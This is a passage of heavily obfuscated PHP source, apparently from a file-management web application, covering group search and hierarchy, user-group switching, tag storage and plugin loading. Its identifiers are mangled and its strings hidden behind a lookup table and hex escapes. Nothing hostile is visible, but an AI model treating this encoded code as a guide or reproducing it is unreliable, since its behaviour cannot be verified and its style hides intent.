$ö–ñ´ôñ[$ıÑüè™[1840]]; $‘Ï÷¡ÃÏ = isset($ö–ñ´ôñ[$ıÑüè™[1841]]) ? $ö–ñ´ôñ[$ıÑüè™[1841]] : !1; if (!trim($æûóïó–)) { return !1; } $æûóïó– = str_replace($ıÑüè™[1842], $ıÑüè™[1843], $æûóïó–); $šõí»„ì = array($ıÑüè™[1749] => array($ıÑüè™[381], "{$æûóïó–}\x25"), $ıÑüè™[28] => array($ıÑüè™[381], "\x25{$æûóïó–}\x25"), $ıÑüè™[996] => $ıÑüè™[1844]); if ($‘Ï÷¡ÃÏ) { $‘ÑÓƒ— = $this->getInfoSimple($‘Ï÷¡ÃÏ); $‹Å„‚–Â = $‘ÑÓƒ—[$ıÑüè™[515]] . $‘Ï÷¡ÃÏ . $ıÑüè™[539]; $šõí»„ì = array($šõí»„ì, array($ıÑüè™[515] => array($ıÑüè™[381], $‹Å„‚–Â))); } $šõí»„ì = $this->parseWhereLike($šõí»„ì); $â¹Í×Òõ = $this->_makeOrder()->where($šõí»„ì)->selectPage(20); $â¹Í×Òõ = $â¹Í×Òõ ? $â¹Í×Òõ : array($ıÑüè™[367] => array(), $ıÑüè™[364] => array()); if (!$â¹Í×Òõ || count($â¹Í×Òõ[$ıÑüè™[367]]) < 5 && Input::check($æûóïó–, $ıÑüè™[316])) { $ïè¨ç¶š = $this->groupChildrenAll($‘Ï÷¡ÃÏ); $œÃ¼¦¢° = $this->_searchFromMeta($ıÑüè™[457], $æûóïó–, 10, $ïè¨ç¶š); $ªŞÕä‹ƒ = $this->_searchFromMeta($ıÑüè™[458], $æûóïó–, 10, $ïè¨ç¶š); $„®¦¨ÂÒ = array_merge($œÃ¼¦¢°, $ªŞÕä‹ƒ, $â¹Í×Òõ[$ıÑüè™[367]]); $â¹Í×Òõ[$ıÑüè™[367]] = array_unique_by_key($„®¦¨ÂÒ, $ıÑüè™[1749]); $â¹Í×Òõ[$ıÑüè™[364]][$ıÑüè™[365]] = count($â¹Í×Òõ[$ıÑüè™[367]]); $â¹Í×Òõ[$ıÑüè™[364]][$ıÑüè™[366]] = ceil($â¹Í×Òõ[$ıÑüè™[364]][$ıÑüè™[365]] / $â¹Í×Òõ[$ıÑüè™[364]][$ıÑüè™[361]]); } $this->_listDataApply($â¹Í×Òõ[$ıÑüè™[367]]); return $â¹Í×Òõ; } protected function groupChildrenAll($˜‰›şÆû) { $ş’ûê‰¸ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$˜‰›şÆû) { return !1; } if (is_string($˜‰›şÆû)) { $˜‰›şÆû = array($˜‰›şÆû); } $òÍ»ë†â = $˜‰›şÆû; foreach ($˜‰›şÆû as $ûï•óí) { $ÅáåìßÖ = $this->getInfoSimple($ûï•óí); $Ø¢ÏãğÏ = array($ş’ûê‰¸[515] => array($ş’ûê‰¸[381], $ÅáåìßÖ[$ş’ûê‰¸[515]] . $ûï•óí . $ş’ûê‰¸[539])); $÷Š¡¸¡Æ = $this->field($ş’ûê‰¸[1749])->where($Ø¢ÏãğÏ)->select(); $òÍ»ë†â = array_merge($òÍ»ë†â, array_to_keyvalue($÷Š¡¸¡Æ, $ş’ûê‰¸[33], $ş’ûê‰¸[1749])); } return array_unique($òÍ»ë†â); } private function _searchFromMeta($Å´üÕ”, $íã›¥ÌË, $…â„ø÷, $ˆ”•¾¢İ) { $·Éş¾š =& $_SERVER[¥ÙÌÜ¾ê]; $íã›¥ÌË = strtolower($íã›¥ÌË); $®³‰‚õ = array($·Éş¾š[93] => $Å´üÕ”, $·Éş¾š[372] => array($·Éş¾š[381], "\45{$íã›¥ÌË}\45")); $®³‰‚õ = $this->parseWhereLike($®³‰‚õ); if ($ˆ”•¾¢İ) { $®³‰‚õ[$·Éş¾š[1749]] = array($·Éş¾š[7], $ˆ”•¾¢İ); } $äµ·µ½¥ = Model($·Éş¾š[1845])->where($®³‰‚õ)->limit($…â„ø÷)->select(); if (!$äµ·µ½¥) { return array(); } $äµ·µ½¥ = array_to_keyvalue($äµ·µ½¥, $·Éş¾š[33], $·Éş¾š[1749]); $´±Ü­²Ë = $this->where(array($·Éş¾š[1836] => array($·Éş¾š[7], $äµ·µ½¥)))->select(); if (!$´±Ü­²Ë) { return array(); } return $´±Ü­²Ë; } protected function _listDataApplyItem($¤ùÑ­ŞÇ) { $ÙÎßó”Ô = array($¤ùÑ­ŞÇ); $this->_listDataApply($ÙÎßó”Ô); return $ÙÎßó”Ô[0]; } protected function _listDataApply(&$èŒàŒâÓ) { $ÄƒøÉÍë =& $_SERVER[¥ÙÌÜ¾ê]; if (!$èŒàŒâÓ) { return; } $ÇÀÎµìõ = array_to_keyvalue($èŒàŒâÓ, $ÄƒøÉÍë[33], $ÄƒøÉÍë[1749]); $this->_listAppendChildren($èŒàŒâÓ); $this->_listAppendChildrenMember($èŒàŒâÓ); $this->_listAppendMeta($èŒàŒâÓ, $ÇÀÎµìõ); $this->_listAppendParent($èŒàŒâÓ); $this->_listAppendSourceRoot($èŒàŒâÓ, $ÇÀÎµìõ); } private function _listAppendChildren(&$‡”¥«) { $ÃÂó¦Êú =& $_SERVER[¥ÙÌÜ¾ê]; $ößƒçÚœ = array_to_keyvalue($‡”¥«, $ÃÂó¦Êú[33], $ÃÂó¦Êú[1749]); $œÆ«ºëú = array($ÃÂó¦Êú[492] => array($ÃÂó¦Êú[7], $ößƒçÚœ)); $¿€çÈ•• = array($ÃÂó¦Êú[492], $ÃÂó¦Êú[1846] => $ÃÂó¦Êú[494]); $ŞÆ˜ï• = $this->field($¿€çÈ••)->where($œÆ«ºëú)->group($ÃÂó¦Êú[492])->select(); $‚†­‚áí = array_to_keyvalue($ŞÆ˜ï•, $ÃÂó¦Êú[492], $ÃÂó¦Êú[494]); foreach ($‡”¥« as &$â™”Ç¥Ê) { $ÉÆ™î³– = $â™”Ç¥Ê[$ÃÂó¦Êú[1749]]; $â™”Ç¥Ê[$ÃÂó¦Êú[1847]] = isset($‚†­‚áí[$ÉÆ™î³–]) ? intval($‚†­‚áí[$ÉÆ™î³–]) : !1; } unset($â™”Ç¥Ê); } private function _listAppendChildrenMember(&$Áª¶ûË£) { $ÊáÅ Å =& $_SERVER[¥ÙÌÜ¾ê]; $Ÿòöä³ = array_to_keyvalue($Áª¶ûË£, $ÊáÅ Å[33], $ÊáÅ Å[1749]); $Û³‹›»Ë = array($ÊáÅ Å[1749] => array($ÊáÅ Å[7], $Ÿòöä³)); $ø§³şµ÷ = array($ÊáÅ Å[1749], $ÊáÅ Å[1846] => $ÊáÅ Å[494]); $üœ»¡ì¢ = Model($ÊáÅ Å[1838])->field($ø§³şµ÷)->where($Û³‹›»Ë)->group($ÊáÅ Å[1749])->select(); $¸ıéÛØÂ = array_to_keyvalue($üœ»¡ì¢, $ÊáÅ Å[1749], $ÊáÅ Å[494]); foreach ($Áª¶ûË£ as &$µÎÊšÓú) { $¶…„Šëı = $µÎÊšÓú[$ÊáÅ Å[1749]]; $µÎÊšÓú[$ÊáÅ Å[1848]] = isset($¸ıéÛØÂ[$¶…„Šëı]) ? intval($¸ıéÛØÂ[$¶…„Šëı]) : !1; } unset($µÎÊšÓú); } private function _listAppendMeta(&$—¸İ¶”é, $©€şÏ©ú) { $‚ÏÏ±ä› =& $_SERVER[¥ÙÌÜ¾ê]; $ˆê•áŠé = array($‚ÏÏ±ä›[1749] => array($‚ÏÏ±ä›[7], $©€şÏ©ú)); $ËÈÈÉ¦· = Model($‚ÏÏ±ä›[1837])->where($ˆê•áŠé)->select(); $ËÈÈÉ¦· = array_to_keyvalue_group($ËÈÈÉ¦·, $‚ÏÏ±ä›[1749]); foreach ($ËÈÈÉ¦· as &$“ïˆù¶Û) { $“ïˆù¶Û = array_to_keyvalue($“ïˆù¶Û, $‚ÏÏ±ä›[93], $‚ÏÏ±ä›[372]); } unset($“ïˆù¶Û); foreach ($—¸İ¶”é as &$ßê¾ğÄ¢) { $ßê¾ğÄ¢[$‚ÏÏ±ä›[459]] = array(); if (isset($ËÈÈÉ¦·[$ßê¾ğÄ¢[$‚ÏÏ±ä›[1749]]])) { $ßê¾ğÄ¢[$‚ÏÏ±ä›[459]] = $ËÈÈÉ¦·[$ßê¾ğÄ¢[$‚ÏÏ±ä›[1749]]]; } } unset($ßê¾ğÄ¢); } protected function parentLevelArray($ëªËÈŒ¦) { $Ì§ˆ¶âİ =& $_SERVER[¥ÙÌÜ¾ê]; $ëªËÈŒ¦ = explode($Ì§ˆ¶âİ[47], trim($ëªËÈŒ¦, $Ì§ˆ¶âİ[47])); $ëªËÈŒ¦ = array_remove_value($ëªËÈŒ¦, $Ì§ˆ¶âİ[191]); return $ëªËÈŒ¦; } private function _listAppendParent(&$ÌğÍŸÁÆ) { $ëàøî‡Ç =& $_SERVER[¥ÙÌÜ¾ê]; $î„ÃÌšî = array(); foreach ($ÌğÍŸÁÆ as &$¹Ìê¤Ùó) { $î„ÃÌšî[$¹Ìê¤Ùó[$ëàøî‡Ç[1749]]] = $¹Ìê¤Ùó[$ëàøî‡Ç[28]]; $‡ô¼©Œ³ = $this->parentLevelArray($¹Ìê¤Ùó[$ëàøî‡Ç[515]]); foreach ($‡ô¼©Œ³ as $ ‰è‹µ) { if (!isset($î„ÃÌšî[$ ‰è‹µ])) { $î„ÃÌšî[$ ‰è‹µ] = 0; } } } unset($¹Ìê¤Ùó); foreach ($î„ÃÌšî as $¨Ì²äâ => $–Ò‰) { if ($–Ò‰) { continue; } $’ª–”­® = $this->getInfoSimple($¨Ì²äâ); $î„ÃÌšî[$¨Ì²äâ] = $’ª–”­®[$ëàøî‡Ç[28]]; } $ ¶öŒÛŠ = $GLOBALS[$ëàøî‡Ç[6]][$ëàøî‡Ç[88]][$ëàøî‡Ç[1849]]; if ($GLOBALS[$ëàøî‡Ç[499]] == $ëàøî‡Ç[87]) { $ ¶öŒÛŠ = !1; } foreach ($ÌğÍŸÁÆ as &$¹Ìê¤Ùó) { $‡ô¼©Œ³ = $this->parentLevelArray($¹Ìê¤Ùó[$ëàøî‡Ç[515]]); $«õ´¸± = $ëàøî‡Ç[33]; foreach ($‡ô¼©Œ³ as $¨Ì²äâ => $ ‰è‹µ) { if ($ ¶öŒÛŠ && $¨Ì²äâ == 0) { continue; } $«õ´¸± .= $î„ÃÌšî[$ ‰è‹µ] . $ëàøî‡Ç[8]; } if ($‡ô¼©Œ³) { $«õ´¸± .= $¹Ìê¤Ùó[$ëàøî‡Ç[28]]; } $¹Ìê¤Ùó[$ëàøî‡Ç[520]] = str_replace($ëàøî‡Ç[523], $ëàøî‡Ç[8], $«õ´¸±); } unset($¹Ìê¤Ùó); } private function _listAppendSourceRoot(&$…Êğ­ÎŸ, $×£É›½) { $âÖñ™´ =& $_SERVER[¥ÙÌÜ¾ê]; $ˆµ÷ğı = array($âÖñ™´[492] => 0, $âÖñ™´[498] => array($âÖñ™´[7], $×£É›½), $âÖñ™´[406] => SourceModel::TYPE_GROUP); $³¯îèó = Model($âÖñ™´[825])->order($âÖñ™´[1850])->field($âÖñ™´[1851]); $¤›Èøú = $³¯îèó->limit(count($×£É›½))->where($ˆµ÷ğı)->select(); $¤›Èøú = array_to_keyvalue($¤›Èøú, $âÖñ™´[498]); $¤›Èøú = array_remove_key($¤›Èøú, $âÖñ™´[498]); foreach ($…Êğ­ÎŸ as &$âÜšøç) { $âÜšøç[$âÖñ™´[85]] = $¤›Èøú[$âÜšøç[$âÖñ™´[1749]]] ? $¤›Èøú[$âÜšøç[$âÖñ™´[1749]]] : array(); } unset($âÜšøç); } protected function groupMerge($¥Øê”ó…) { $¥Øê”ó… = array_values(array_unique($¥Øê”ó…)); $ĞîÃ©Í = array(); for ($Â˜¥¶Êö = 0; $Â˜¥¶Êö < count($¥Øê”ó…); $Â˜¥¶Êö++) { $Ò©ß¹ì½ = !1; for ($ëî÷é¡ = 0; $ëî÷é¡ < count($¥Øê”ó…); $ëî÷é¡++) { if ($Â˜¥¶Êö == $ëî÷é¡) { continue; } if ($this->isParentOf($¥Øê”ó…[$ëî÷é¡], $¥Øê”ó…[$Â˜¥¶Êö])) { $Ò©ß¹ì½ = !0; break; } } if (!$Ò©ß¹ì½) { $ĞîÃ©Í[] = $¥Øê”ó…[$Â˜¥¶Êö]; } } return $ĞîÃ©Í; } protected function isParentOf($¿øŒ“ù, $Ïçàù¢) { $¯Êóî« =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¿øŒ“ù || !$Ïçàù¢ || $¿øŒ“ù == $Ïçàù¢) { return !1; } $äªıÖ¬Í = $this->getInfoSimple($¿øŒ“ù); $ºØ¸ÆÈ = $this->getInfoSimple($Ïçàù¢); $ÜáîÙ÷ = $äªıÖ¬Í[$¯Êóî«[515]] . $¿øŒ“ù . $¯Êóî«[47]; if (substr($ºØ¸ÆÈ[$¯Êóî«[515]], 0, strlen($ÜáîÙ÷)) == $ÜáîÙ÷) { return !0; } return !1; } public function groupShowRoot($¼ì¨ë¬Æ, $šÊå¯æÃ = false) { $Ç¡°¬ =& $_SERVER[¥ÙÌÜ¾ê]; $è×”§øÂ = $this->getInfo($¼ì¨ë¬Æ); if (!$è×”§øÂ) { return array(); } $ĞòàÑÕù = $this->parentLevelArray($è×”§øÂ[$Ç¡°¬[515]]); $Ì¼›ã±­ = array($¼ì¨ë¬Æ); if (count($ĞòàÑÕù) == 0) { return $Ì¼›ã±­; } if ($šÊå¯æÃ && count($ĞòàÑÕù) == 1) { return $Ì¼›ã±­; } if (!$è×”§øÂ[$Ç¡°¬[459]] || !isset($è×”§øÂ[$Ç¡°¬[459]][$Ç¡°¬[1834]]) || $è×”§øÂ[$Ç¡°¬[459]][$Ç¡°¬[1834]] == $Ç¡°¬[1803]) { return $this->groupShowRoot($ĞòàÑÕù[count($ĞòàÑÕù) - 1], $šÊå¯æÃ); } if ($è×”§øÂ[$Ç¡°¬[459]][$Ç¡°¬[1834]] == $Ç¡°¬[355]) { $ì¼Òú…½ = explode($Ç¡°¬[47], $è×”§øÂ[$Ç¡°¬[459]][$Ç¡°¬[1835]]); if ($ì¼Òú…½) { $Ì¼›ã±­ = array_merge($Ì¼›ã±­, $ì¼Òú…½); } } return $Ì¼›ã±­; } protected function resetParentLevel() { $¶òëÔ¦É =& $_SERVER[¥ÙÌÜ¾ê]; $ÓîÊ»ø = $¶òëÔ¦É[1749]; $É¼…ñâ¥ = $this->select(); $É¼…ñâ¥ = array_to_keyvalue($É¼…ñâ¥, $ÓîÊ»ø); foreach ($É¼…ñâ¥ as $å¬±„ˆ) { $Şêˆåìô = $å¬±„ˆ; $™‘ùÅÊ® = array(); while ($Şêˆåìô[$¶òëÔ¦É[492]] != 0) { $™‘ùÅÊ®[] = $Şêˆåìô[$¶òëÔ¦É[492]]; $Şêˆåìô = $É¼…ñâ¥[$Şêˆåìô[$¶òëÔ¦É[492]]]; } $™‘ùÅÊ®[] = 0; $™‘ùÅÊ® = $¶òëÔ¦É[47] . implode($¶òëÔ¦É[47], array_reverse($™‘ùÅÊ®)) . $¶òëÔ¦É[47]; $this->setNamePinyin($å¬±„ˆ[$ÓîÊ»ø], $å¬±„ˆ[$¶òëÔ¦É[28]]); $this->where(array($ÓîÊ»ø => $å¬±„ˆ[$ÓîÊ»ø]))->save(array($¶òëÔ¦É[578] => $™‘ùÅÊ®)); } return $É¼…ñâ¥; } public function groupNameAuto($Ğàìë°, $ã­Ã‰) { $Â¢”ÌŒ® =& $_SERVER[¥ÙÌÜ¾ê]; $§×íöş = $this->where(array($Â¢”ÌŒ®[396] => $Ğàìë°))->getField($Â¢”ÌŒ®[28], !0); if (!$§×íöş || !in_array($ã­Ã‰, $§×íöş)) { return $ã­Ã‰; } for ($ËÀ—›» = 1; $ËÀ—›» <= count($§×íöş) + 1; $ËÀ—›»++) { $İçáí±„ = $ã­Ã‰ . "\x28{$ËÀ—›»}\51"; if (!in_array($İçáí±„, $§×íöş)) { return $İçáí±„; } } } public function groupSwitch($øçğµ¥Š, $Á¸Œ¤Åò) { $ÅÎŞ­¯™ =& $_SERVER[¥ÙÌÜ¾ê]; $—¤“Ù„  = array($ÅÎŞ­¯™[1749] => array($ÅÎŞ­¯™[7], array($øçğµ¥Š, $Á¸Œ¤Åò))); $Ô›À±¸ç = $this->where($—¤“Ù„ )->select(); $Ô›À±¸ç = array_to_keyvalue($Ô›À±¸ç, $ÅÎŞ­¯™[1749]); if (!isset($Ô›À±¸ç[$øçğµ¥Š]) || !isset($Ô›À±¸ç[$Á¸Œ¤Åò]) || $Ô›À±¸ç[$øçğµ¥Š][$ÅÎŞ­¯™[492]] == 0) { return !1; } $—¤“Ù„  = array($ÅÎŞ­¯™[1749] => $øçğµ¥Š); $áù¿¢øë = Model($ÅÎŞ­¯™[1838])->where($—¤“Ù„ )->select(); if (!$áù¿¢øë) { $áù¿¢øë = array(); } foreach ($áù¿¢øë as $ä¶ˆë¬û) { $ıôĞÇ¾ = $ä¶ˆë¬û[$ÅÎŞ­¯™[1581]]; $—¤“Ù„  = array($ÅÎŞ­¯™[1581] => $ıôĞÇ¾, $ÅÎŞ­¯™[1749] => $Á¸Œ¤Åò); $ÀıÑ­œ = Model($ÅÎŞ­¯™[1838])->where($—¤“Ù„ )->find(); if (!$ÀıÑ­œ) { $´“ş ş = array($Á¸Œ¤Åò => $ä¶ˆë¬û[$ÅÎŞ­¯™[1852]]); Model($ÅÎŞ­¯™[532])->userGroupAdd($ıôĞÇ¾, $´“ş ş); } Model($ÅÎŞ­¯™[532])->userGroupRemove($ıôĞÇ¾, $øçğµ¥Š); } $—¤“Ù„  = array($ÅÎŞ­¯™[406] => 2, $ÅÎŞ­¯™[492] => 0, $ÅÎŞ­¯™[405] => 1, $ÅÎŞ­¯™[498] => array($ÅÎŞ­¯™[7], array($øçğµ¥Š, $Á¸Œ¤Åò))); $Çü§»†Æ = Model($ÅÎŞ­¯™[825])->where($—¤“Ù„ )->field($ÅÎŞ­¯™[1853])->select(); $Çü§»†Æ = array_to_keyvalue($Çü§»†Æ, $ÅÎŞ­¯™[498], $ÅÎŞ­¯™[397]); $Ïó¹¨Ø¯ = !empty($Çü§»†Æ[$øçğµ¥Š]) ? $Çü§»†Æ[$øçğµ¥Š] : !1; if ($Ïó¹¨Ø¯) { if (!$Çü§»†Æ[$Á¸Œ¤Åò]) { $Çü§»†Æ[$Á¸Œ¤Åò] = Model($ÅÎŞ­¯™[825])->groupRootAdd($Á¸Œ¤Åò); } $½á¼ª±… = $Çü§»†Æ[$Á¸Œ¤Åò]; $—¤“Ù„  = array($ÅÎŞ­¯™[492] => $Ïó¹¨Ø¯); $Çü§»†Æ = Model($ÅÎŞ­¯™[825])->where($—¤“Ù„ )->field($ÅÎŞ­¯™[1854])->select(); if (!$Çü§»†Æ) { $Çü§»†Æ = array(); } Model($ÅÎŞ­¯™[825])->moveClearAuth = !1; foreach ($Çü§»†Æ as $¡íµÏû­) { $‡šÓşã = $¡íµÏû­[$ÅÎŞ­¯™[405]] == $ÅÎŞ­¯™[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÅÎŞ­¯™[825])->move($¡íµÏû­[$ÅÎŞ­¯™[397]], $½á¼ª±…, $‡šÓşã); } Model($ÅÎŞ­¯™[825])->moveClearAuth = !0; $—¤“Ù„  = array($ÅÎŞ­¯™[406] => 2, $ÅÎŞ­¯™[498] => $øçğµ¥Š); $¡“¢Ë« = array($ÅÎŞ­¯™[498] => $Á¸Œ¤Åò); Model($ÅÎŞ­¯™[1855])->where($—¤“Ù„ )->save($¡“¢Ë«); Model($ÅÎŞ­¯™[1856])->where($—¤“Ù„ )->save($¡“¢Ë«); } $this->_changeChildLevel($Ô›À±¸ç[$øçğµ¥Š], $Ô›À±¸ç[$Á¸Œ¤Åò], !0); $this->where(array($ÅÎŞ­¯™[492] => $øçğµ¥Š))->save(array($ÅÎŞ­¯™[492] => $Á¸Œ¤Åò)); $this->_clearChildrenCache($Ô›À±¸ç[$Á¸Œ¤Åò]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($†Ğ ”) { $à“´‰ïû =& $_SERVER[¥ÙÌÜ¾ê]; return array($à“´‰ïû[1857] => array($†Ğ ”[0], $à“´‰ïû[1858]), $à“´‰ïû[1859] => array($†Ğ ”[0], $à“´‰ïû[1860])); } protected function get($ışË¨Å) { $²Èé‹öå =& $_SERVER[¥ÙÌÜ¾ê]; $îè·ÊÆ‰ = Model($²Èé‹öå[516])->metaGet($ışË¨Å, $²Èé‹öå[1861]); $õµá¯† = json_decode($îè·ÊÆ‰, !0); return $õµá¯† ? $õµá¯† : array($²Èé‹öå[1862] => $²Èé‹öå[87], $²Èé‹öå[367] => array()); } protected function set($Œ ÉœïÏ, $áêÚ”ä¦) { $ş‘£’ŠË =& $_SERVER[¥ÙÌÜ¾ê]; $áêÚ”ä¦ = $áêÚ”ä¦ ? $áêÚ”ä¦ : array($ş‘£’ŠË[1862] => $ş‘£’ŠË[87], $ş‘£’ŠË[367] => array()); Model($ş‘£’ŠË[516])->metaSet($Œ ÉœïÏ, $ş‘£’ŠË[1861], json_encode($áêÚ”ä¦)); return Model($ş‘£’ŠË[516])->metaSet($Œ ÉœïÏ, $ş‘£’ŠË[1861], json_encode($áêÚ”ä¦)); } protected function getByTagID($­Øœèâ, $Ïí´š±µ) { $íÏÎ‹íŸ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$­Øœèâ || !$Ïí´š±µ) { return !1; } if (!Model($íÏÎ‹íŸ[516])->getInfoSimple($­Øœèâ)) { return !1; } $”·¯„€÷ = $this->get($­Øœèâ); if (!$”·¯„€÷ || !isset($”·¯„€÷[$íÏÎ‹íŸ[367]])) { return !1; } $ÒÔ˜Ñ³­ = array_find_by_field($”·¯„€÷[$íÏÎ‹íŸ[367]], $íÏÎ‹íŸ[395], $Ïí´š±µ); return is_array($ÒÔ˜Ñ³­) ? $ÒÔ˜Ñ³­ : !1; } public function listSource($“¼¼ùú, $›Àş¿ë) { $İ‘Ş®¨ =& $_SERVER[¥ÙÌÜ¾ê]; if ($›Àş¿ë && !is_array($›Àş¿ë)) { $›Àş¿ë = array($›Àş¿ë); } $ÍÚğ² ¥ = $this->listData($“¼¼ùú); $ı±şÄØ‚ = array(); foreach ($ÍÚğ² ¥ as $Ã»§•ö´) { $ş» º‰« = $Ã»§•ö´[$İ‘Ş®¨[76]]; if (!$ş» º‰«) { continue; } if (!isset($ı±şÄØ‚[$ş» º‰«])) { $ı±şÄØ‚[$ş» º‰«] = array(); } $ı±şÄØ‚[$ş» º‰«][] = $Ã»§•ö´[$İ‘Ş®¨[421]]; } $ŒıÒ— = array(); foreach ($ı±şÄØ‚ as $‹Å™Ğ‘Õ => $ã‰ÃíÇ¸) { $ˆñÛ‡ĞÁ = !0; if (!$›Àş¿ë) { $ŒıÒ—[] = $‹Å™Ğ‘Õ; continue; } foreach ($›Àş¿ë as $£Ú˜¿üí) { if (!in_array($£Ú˜¿üí, $ã‰ÃíÇ¸)) { $ˆñÛ‡ĞÁ = !1; break; } } if ($ˆñÛ‡ĞÁ) { $ŒıÒ—[] = $‹Å™Ğ‘Õ; } } if (!$ŒıÒ—) { return array(); } $Ûó£ËŒİ = array($İ‘Ş®¨[412] => array($İ‘Ş®¨[413], $ŒıÒ—), $İ‘Ş®¨[498] => $“¼¼ùú, $İ‘Ş®¨[406] => SourceModel::TYPE_GROUP); $ùíÙ¿³® = Model($İ‘Ş®¨[1253])->listSource($Ûó£ËŒİ); if (!$ùíÙ¿³® || count($ŒıÒ—) == $ùíÙ¿³®[$İ‘Ş®¨[364]][$İ‘Ş®¨[365]]) { return $ùíÙ¿³®; } $ºó£ÂÁâ = array(); $–şÉ‚Üƒ = array_to_keyvalue($ùíÙ¿³®[$İ‘Ş®¨[75]], $İ‘Ş®¨[33], $İ‘Ş®¨[397]); $½€áÊõ£ = array_to_keyvalue($ùíÙ¿³®[$İ‘Ş®¨[74]], $İ‘Ş®¨[33], $İ‘Ş®¨[397]); $™ğ’û»” = array_merge($½€áÊõ£, $–şÉ‚Üƒ); foreach ($ŒıÒ— as $ş» º‰«) { if (!in_array($ş» º‰«, $™ğ’û»”)) { $ºó£ÂÁâ[] = $ş» º‰«; } } if ($ºó£ÂÁâ) { $this->removeBySource($“¼¼ùú, $ºó£ÂÁâ); } return $ùíÙ¿³®; } protected function listData($õó¿¥ß) { $Ğ‘µş¯» =& $_SERVER[¥ÙÌÜ¾ê]; $ĞƒêıŠÜ = array($Ğ‘µş¯»[1572] => 0, $Ğ‘µş¯»[477] => array($Ğ‘µş¯»[1863], 0), $Ğ‘µş¯»[417] => $Ğ‘µş¯»[1864] . $õó¿¥ß); $æñşÏéê = $Ğ‘µş¯»[1865]; $šØ—œ  = $this->field($æñşÏéê)->where($ĞƒêıŠÜ)->order($Ğ‘µş¯»[1866])->select(); return $šØ—œ  ? $šØ—œ  : array(); } protected function addToTag($½ÙÔù£º, $ûáùù, $Ë×µÌ¹¡) { $¬‡ô ü„ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->getByTagID($½ÙÔù£º, $Ë×µÌ¹¡) || !$ûáùù) { return !1; } if (!Model($¬‡ô ü„[825])->pathInfo($ûáùù)) { return !1; } $÷˜ğÎÒ = array($¬‡ô ü„[1572] => 0, $¬‡ô ü„[477] => $Ë×µÌ¹¡, $¬‡ô ü„[416] => $ûáùù, $¬‡ô ü„[417] => $¬‡ô ü„[1867] . $½ÙÔù£º, $¬‡ô ü„[415] => $¬‡ô ü„[33], $¬‡ô ü„[1753] => 0); if ($this->where($÷˜ğÎÒ)->find()) { return !1; } return $this->add($÷˜ğÎÒ); } protected function removeFromTag($€Íğ®ë, $êµ–†Ì, $Û´§ú§€) { $ÅÌ–‹“ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->getByTagID($€Íğ®ë, $Û´§ú§€) || !$êµ–†Ì) { return !1; } if (is_array($êµ–†Ì)) { $êµ–†Ì = array($ÅÌ–‹“[7], $êµ–†Ì); } $¤÷¿Äªş = array($ÅÌ–‹“[1572] => 0, $ÅÌ–‹“[477] => $Û´§ú§€, $ÅÌ–‹“[417] => $ÅÌ–‹“[1867] . $€Íğ®ë, $ÅÌ–‹“[416] => $êµ–†Ì); return $this->where($¤÷¿Äªş)->delete(); } protected function removeByTag($Ç¡â¾², $©õïÃ) { $•ÓŞ¨Ì† =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->getByTagID($Ç¡â¾², $©õïÃ)) { return !1; } $ßÊÛÕÚ = array($•ÓŞ¨Ì†[1572] => 0, $•ÓŞ¨Ì†[477] => $©õïÃ, $•ÓŞ¨Ì†[417] => $•ÓŞ¨Ì†[1867] . $Ç¡â¾²); return $this->where($ßÊÛÕÚ)->delete(); } protected function removeBySource($“©×¸İŞ, $ØÙ›¹Òµ) { $ì¬Î±Â¼ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$“©×¸İŞ || !$ØÙ›¹Òµ) { return !1; } if (is_array($ØÙ›¹Òµ)) { $ØÙ›¹Òµ = array($ì¬Î±Â¼[7], $ØÙ›¹Òµ); } $‚âéå‚É = array($ì¬Î±Â¼[1572] => 0, $ì¬Î±Â¼[416] => $ØÙ›¹Òµ, $ì¬Î±Â¼[477] => array($ì¬Î±Â¼[1010], 0), $ì¬Î±Â¼[417] => $ì¬Î±Â¼[1867] . $“©×¸İŞ); return $this->where($‚âéå‚É)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x70\154\165\147\151\156\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\163\164\x61\x74\165\163", "\x72\x65\147\x69\x65\163\x74", "\143\x6f\156\x66\x69\147"); public function loadList($ëÏøìŒ = false) { $Àì¢µ‰¾ = array_to_keyvalue($this->listData(), $_SERVER[¥ÙÌÜ¾ê][28]); if ($ëÏøìŒ) { return $Àì¢µ‰¾[$ëÏøìŒ]; } return $Àì¢µ‰¾; } public function init() { $—‚µ´½Ö =& $_SERVER[¥ÙÌÜ¾ê]; Hook::trigger($—‚µ´½Ö[1868]); $·Ø‘éÂ = $this->loadPluginList(); foreach ($·Ø‘éÂ as $…ø³†µí => $ÖŞ‰İÅ) { $áÖô°—Ç = $this->appAllow($…ø³†µí, $ÖŞ‰İÅ); if (!$áÖô°—Ç) { continue; } foreach ($ÖŞ‰İÅ[$—‚µ´½Ö[1869]] as $Œ¯´É•¥ => $Î©ÄÀË) { Hook::bind($Œ¯´É•¥, $Î©ÄÀË); } } Hook::trigger($—‚µ´½Ö[1870]); Hook::trigger(ACTION); } public function appAllow($ìëñ²ª, $ÔÓÄ¸¾, $‘ğÄ¦…¢ = true) { $ÀÅËåş =& $_SERVER[¥ÙÌÜ¾ê]; $•²¡ÓÌ½ = PLUGIN_DIR . $ìëñ²ª . $ÀÅËåş[1871]; if (!is_array($ÔÓÄ¸¾) || !is_array($ÔÓÄ¸¾[$ÀÅËåş[1869]]) || $ÔÓÄ¸¾[$ÀÅËåş[743]] != 1 || !is_file($•²¡ÓÌ½)) { return !1; } if ($GLOBALS[$ÀÅËåş[499]] == 1) { return !0; } if ($‘ğÄ¦…¢ && !Action($ÀÅËåş[1872])->checkAuth($ìëñ²ª)) { return !1; } return !0; } public function unInstall($“âØø¤¤) { $©™±ëÛ =& $_SERVER[¥ÙÌÜ¾ê]; $“Ò”ÌòÇ = $this->loadList($“âØø¤¤); if (file_exists(PLUGIN_DIR . $“âØø¤¤)) { Hook::apply($“âØø¤¤ . $©™±ëÛ[1873]); } $this->remove($“Ò”ÌòÇ[$©™±ëÛ[395]]); } public function changeStatus($ï÷Ö¦É», $ìšÀø®Í) { $ ÉçùÙì 